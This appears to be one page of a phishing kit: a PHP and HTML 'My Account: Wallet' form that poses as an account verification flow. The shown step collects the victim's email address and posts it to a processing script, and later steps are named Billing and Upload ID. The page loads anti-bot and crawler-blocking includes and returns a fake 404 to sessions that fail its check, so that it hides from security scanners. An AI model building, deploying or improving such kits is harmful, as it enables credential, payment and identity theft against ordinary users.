<?php
session_start();
        include'antibots/IP-BlackList.php';  
        include'antibots/Bot-Crawler.php';
        include'antibots/Bot-Spox.php'; 
        include'antibots/Dila_DZ.php';
        @require "antibots/Crawler/src/CrawlerDetect.php";

        use JayBizzle\CrawlerDetect\CrawlerDetect;
if (!isset($_SESSION['check1'])) {

  header("HTTP/1.0 404 Not Found");
  exit();
}
$_SESSION['css2'] = "true";


?>

<html><head>
						<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
						<meta http-equiv="X-UA-Compatible" content="IE=Edge">
						<link rel="shortcut icon" href="./assets/images/favi.ico">
						<link rel="apple-touch-icon" href="./assets/images/favi.png">
						<meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, maximum-scale=1, user-scalable=yes">
						<title>My Account: Wallet</title>
						<link href="https://fonts.googleapis.com/css2?family=Material+Icons" rel="stylesheet">
						<link href="https://fonts.googleapis.com/css?family=Raleway|Rock+Salt|Source+Code+Pro:300,400,600" rel="stylesheet">
						<link rel="stylesheet" href="./assets/css/2.php">
						<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
						<script src="https://cdnjs.cloudflare.com/ajax/libs/modernizr/2.8.3/modernizr.min.js"></script>
						<script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/imask/3.4.0/imask.min.js"></script>
						<meta http-equiv="cache-control" content="no-cache">
						<meta http-equiv="expires" content="0">
						<meta http-equiv="pragma" content="no-cache">
				
					</head>
				  <body>
				  <header>
					<div>
					</div>
				</header>
					<div class="mainContainer ">
					<div class="bg">
					</div>
					  <div class="hide" id="rotate">
					  <div class="circle">
					  </div>
						<div class="overlay">
						</div>
					  </div>
					  <div class="contents">
					  <div class="modal hide js-modal">
					  <div class="l-modal-shadow js-modal-hide"></div>
					  <div class="c-popup l-modal-body">
						<div class="c-popup-img">
						  <img src="./assets/images/warning.png">
						</div>
						<h3 class="c-popup-title">Warning!</h3>
						<p class="c-popup-description">Complete the progress first</p>
							<input style="width:50%" class="bt js-modal-hide" type="submit" value="Continue">
					  </div>
					  </div>
				  <div class="mainContents">
				<a href="#" class="close-icon js-modal-hide"></a>
				  <ol class="steps js-modal-hide">
					<li id="signed"><a class="signed" href="#">Signed</a></li>
					<li id="Protected"><a class="Protected" href="#">Protected</a></li><li id="Verify" class="current"><a class="Verify" href="#">Verify Ownership</a></li><li id="Billing"><a class="Billing" href="#">Billing</a></li><li id="Upload"><a class="Upload" href="#">Upload ID</a></li>
					<li id="Completed"><a class="Completed" href="#">Completed</a></li>
				  </ol>
				  <div id="process">
	

	<form class="form" action="./process/config1.php" method="post" style="padding:0 20px" novalidate="on">
	<div class="fields clearfix">
		<section id="sift-verification">
		  <img id="logo" class="img-email" src="./assets/images/af8d9ac62dd43026957e1cf82a027637.gif">
		  <div class="form-container">
			</div><div class="inputArea">
				<input id="eml" name="email" type="email" required="" placeholder="Enter your email address">
			  </div>

		<div>
		  <input style="margin: 10px 0px;width: 70%;background-color: #0b6efd;border: 1px solid #bfb9b9;border-radius: 5px;box-shadow: 0 30px 30px rgba(0,0,0,.4);" type="submit" id="xsapd" class="bt" value="Verify">

		  </div>
	  
  </section></div></form>
	

		<script> 
		$("#Billing,#Verify,#Upload,#Completed").removeClass("current");

		$("#Verify").addClass("current"); 
		$(document).ready(function () {
			function valid() {
				var check = true;
				var ii = 0;
				$("#process input:not(.bt):not([type=checkbox]),#process select").each(function (i, el) {
					if (!$(el).val()) {
						$(el).parent().addClass("hasError");
						check = false;
					} else {
						$(el).parent().removeClass("hasError");
					}
		
				});
				return check;
			}});
			
		</script>
							</div>
					</div>
					<script type="text/javascript">
					$(".js-modal-hide").click(function(){$(".js-modal").toggleClass("hide");});
					$(".js-alert-hide").click(function(){$(".js-alert").toggleClass("hide");});
					</script>
					</div>
					
					
					</div></body></html>